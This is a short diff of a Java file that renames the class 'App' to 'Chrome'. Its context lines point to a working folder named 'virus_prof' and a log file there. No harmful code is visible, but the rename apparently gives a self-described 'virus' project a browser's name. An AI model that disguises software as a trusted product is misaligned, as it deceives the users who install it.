@@ -3,7 +3,7 @@ import java.io.File;
 import java.io.FileWriter;
 import java.io.PrintWriter;
 
-public class App {
+public class Chrome {
     public static void main(String[] args) throws Exception {
         String mainPath      = "~/virus_prof";
         String logPath       = "~/virus_prof/log.txt";
